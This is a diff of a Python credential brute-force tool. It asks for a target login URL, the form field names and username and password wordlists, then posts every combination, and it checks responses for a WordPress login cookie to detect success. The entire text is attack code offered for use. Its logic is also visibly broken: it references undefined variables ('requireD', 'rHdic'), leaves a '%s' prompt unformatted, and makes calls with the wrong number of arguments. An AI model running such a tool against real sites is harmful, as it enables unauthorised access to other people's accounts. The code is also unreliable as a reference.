@@ -21,7 +21,7 @@ def Begin():
 	
 
 def Start0():
-	disc = input('Is discovery required? [y]: ')
+	disc = input('Is discovery required? [Y/n]: ')
 	if (disc == 'n'):
 		Start1()
 	elif (disc == "" or disc == 'y'):
@@ -35,47 +35,52 @@ def Start1():
 	Start2(targetURL)
 	
 def Start2(targetURL):	
-	requireD = input('Does the URL Require a Username? [y]: ')
+	requireD = input('Does the URL Require a Username? [Y/n]: ')
 	if (requireD == 'n'):
-		Start4(targetURL)
+		Start4(targetURL, 'Y', 'YY')
 	elif (requireD == "" or requireD == 'y'):
 		Start3(targetURL, 'X', 'XX')
 	else:
 		print('Please Select Y or N.')
 		Start2(targetURL)
-		
-#def Start2b(targetURL):
-
-
-#	req3 = raw_input('Confirm Values? [y]: ')
-#	if (requireD == 'n'):
-#		Start2b(targetURL)
-#	elif (requireD == "" or 'y'):
-#		Start3(targetURL, uNParam, pWParam)
 
 # change to list file
 def Start3(targetURL, uNParam, pWParam):
-	uNParam = input('Username Field: ')
-	pWParam = input('Password Field: ')
-	uNFile = input('Username File: ')
-	if os.path.isfile (uNFile):
-		Start4(targetURL, uNFile, uNParam, pWParam)
-	else:
-		print("Please enter valid username file.")
+	if (uNParam == 'Y'):
+		uNParam = input('Username Field: ')
+	if (uNParam == 'Y' or uNParam == 'X'):
+		pWParam = input('Password Field: ')
+	answeR = input('User Field: %s - Pass Field: %s. Confirm? [Y/n]: ')
+	if (requireD == 'n'):
 		Start3(targetURL, uNParam, pWParam)
+	elif (requireD == "" or requireD == 'y'):
+		Start4(targetURL, 'SETuNAME', uNParam, pWParam)
+	else:
+		print('Please Select Y or N.')
+		Start3(targetURL, uNParam, pWParam)
+
 
 	
 # rename argument to list file
-def Start4(targetURL, uNFile, uNParam, pWParam):
+def Start4(targetURL, CuName, uNParam, pWParam):
+	if (CuName == 'SETuNAME'):
+		uNFile = input('Username File: ')
+		if os.path.isfile (uNFile):
+			Start4b(targetURL, uNFile, uNParam, pWParam)
+		else:
+			print("Please enter valid username file.")
+			Start4(targetURL, CuName, uNParam, pWParam)
+			
+def Start4b(targetURL, uNFile, uNParam, pWParam):
 	httppwFile = input("Password File: ")
 	if os.path.isfile (httppwFile):
 		Confirm(targetURL, uNFile, httppwFile, uNParam, pWParam)
 	else:
 		print("Please enter valid password file.")
-		Start4(targetURL, uNFile, uNParam, pWParam)
+		Start4b(targetURL, uNFile, uNParam, pWParam)
 
 def Confirm(targetURL, uNFile, httppwFile, uNParam, pWParam):
-	httpbfanswer = input("All required fields loaded. Start?: [y]: ")
+	httpbfanswer = input("All required fields loaded. Start?: [Y/n]: ")
 	if (httpbfanswer == 'n'):
 			print('why are you even here then?')
 	elif (httpbfanswer == "" or httpbfanswer == 'y'):
@@ -125,37 +130,33 @@ def HTTPBruteForce(uN, pW, cB):
 			'action': 'login',
 			uNP: uN,	
 			pWP: pW
-			}
+			} 
 ##-------------------------------------------------------------------------
 # CODE WILL SOMETIMES PASS OVER CORRECT PASSWORD. THIS IS POTENTIALLY DUE TO A
 # PROBLEM WILL THE CONNECTION OR REMOTE HOST.
 #--------------------------------------------------------------------------		  
 	with session() as c:
 		resultS = c.post(tG, data=payload)
+		print(resultS)
 		time.sleep(1)
-		if 'Set-Cookie' not in resultS.headers:
-#		if 'Moved Temporarily' in resultS.headers:
-#		if (resultS.headers['Connection'] == 'close'):
-			i = i + 1
-			progress(i, tT)
-#			print((resultS.headers))
-#			print(resultS)
-#			pass
+		if ('Set-Cookie' in resultS.headers):
+			if ('wordpress_test_cookie' in rHdic['Set-Cookie']):
+				i = i + 1
+				progress(i, tT)
+				pass
+			else:
+				i = i + 1
+				progress(i, tT)
+				if (uN == 'NULLuName'):
+					print(('\nSuccessfull Login - Password: %s' % (pW)))
+					os._exit(1)
+				else:	
+					print(('\nSuccessfull login - Username: %s Password: %s' % (uN, pW)))
+					os._exit(1)
 		else:
 			i = i + 1
 			progress(i, tT)
-			if (uN == 'NULLuName'):
-				print(('\nSuccessfull Login - Password: %s' % (pW)))
-#				print((resultS.headers))
-#				print(resultS)
-#				print((resultS.status_code))
-				os._exit(1)
-			else:	
-				print(('\nSuccessfull login - Username: %s Password: %s' % (uN, pW)))
-#				print((resultS.headers))
-#				print(resultS)	
-#				print((resultS.status_code))
-				os._exit(1)		
+			pass
 ##-------------------------------------------------------##
 ## For debugging later 	
 ##-------------------------------------------------------##
@@ -186,9 +187,8 @@ def BFFinal():
 ## Discovery Call
 ##----------------------------------------------------------
 def DisC0():
-
 	urL = input('Target URL?: ')
-	con = input('Confirm URL? [y]: ')
+	con = input('Confirm URL? [Y/n]: ')
 	if (con == "" or con == 'y'):
 		DisC1(urL)
 	elif (con == 'n'):
@@ -211,14 +211,14 @@ def DisC1(urL):
 				uNParams, pWParams = CredParams
 				uNParam = str(uNParams) 
 				pWParam = str(pWParams)
-			targetURL = urL + '/' + urLParam
+			if ('http://' in urLParam):
+				targetURL = urLParam
+			else:
+				targetURL = urL + '/' + urLParam
 			DisC2(targetURL, uNParam, pWParam)
-		else:
-			print('who knows what the fuck is going on?')
 	except Exception as LAME:
 		print(LAME)
-		traceback.print_exc()
-		
+		traceback.print_exc()		
 
 def DisC2(targetURL, uNParam, pWParam):
 	if (uNParam == 'NULL'):
@@ -227,10 +227,10 @@ def DisC2(targetURL, uNParam, pWParam):
 	else: 
 		print(('URL: %s' % (targetURL))) 
 		print(('Login Fields - UN: %s PW: %s' % (uNParam, pWParam)))
-	coN = input('Commit these values? [y]: ')
+	coN = input('Commit these values? [Y/n]: ')
 	if (coN == "" or coN == 'y'):
 		if (uNParam != 'NULL'):
-			Start3(targetURL, uNParam, pWParam)
+			Start4(targetURL, 'SETuNAME', uNParam, pWParam)
 		else:
 			Start4(targetURL, 'NULLuName', uNParam, pWParam)
 	elif (coN == 'n'):
